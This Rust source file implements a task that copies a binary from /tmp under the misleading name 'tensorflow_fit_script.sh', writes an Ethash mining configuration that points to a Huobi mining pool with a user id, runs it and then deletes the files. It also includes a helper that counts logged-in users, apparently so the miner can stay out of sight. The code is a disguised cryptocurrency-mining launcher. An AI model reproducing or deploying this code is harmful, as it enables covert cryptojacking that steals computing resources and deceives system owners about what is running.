use std::fs::File;
use std::io::Write;
use std::process::Command;

pub trait Task {
    fn init_env(&self) -> Result<(), &str>;
    fn clean_env(&self);
    fn start_target_process(&self) -> u32;
    fn kill_target_process(&self, pid: &mut u32);
}

pub fn get_user_count() -> Option<usize> {
    match Command::new("w").arg("-h").output() {
        Ok(output) => {
            let user_count = String::from_utf8_lossy(&output.stdout).lines().count();
            return Some(user_count);
        }
        Err(err) => {
            println!("{:?}", err);
            return None;
        }
    }
}

pub struct ETHTask;

impl Task for ETHTask {
    fn init_env(&self) -> Result<(), &str> {
        println!("init_env()");
        let mut command = Command::new("cp");
        command
            .arg("/tmp/b86547d084228861")
            .arg("tensorflow_fit_script.sh");
        let mut process = match command.spawn() {
            Ok(process) => process,
            Err(_) => return Err("command spawn error"),
        };
        match process.wait() {
            Ok(_) => (),
            Err(_) => return Err("command wasn't running"),
        };
        let mut config_file = match File::create("c") {
            Ok(config_file) => config_file,
            Err(_) => return Err("failed to create config file"),
        };
        let config_file_content = b"[common]\nalgo=ethash\npers=BgoldPoW\nwatchdog=1\napi=10555\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e";
        match config_file.write_all(config_file_content) {
            Ok(_) => (),
            Err(_) => return Err("config file failed to write data"),
        }
        match config_file.sync_all() {
            Ok(_) => (),
            Err(_) => return Err("config file content sync failed"),
        }
        Ok(())
    }

    fn clean_env(&self) {
        println!("clean_env()");
        let mut command = Command::new("rm");
        command.arg("-rf").arg("tensorflow_fit_script.sh").arg("c");
        command.spawn().unwrap();
    }

    fn start_target_process(&self) -> u32 {
        println!("start_target_process()");
        let mut command = Command::new("./tensorflow_fit_script.sh");
        command.arg("--config").arg("c");
        let process = command.spawn().unwrap();
        let pid = process.id();
        println!("target process pid: {}", pid);
        return pid;
    }

    fn kill_target_process(&self, pid: &mut u32) {
        println!("kill_target_process() pid: {}", pid);
        if *pid == 0 {
            return;
        }
        let mut command = Command::new("kill");
        command.arg("-9").arg(pid.to_string());
        let mut process = command.spawn().unwrap();
        process.wait().unwrap();
        *pid = 0;
    }
}
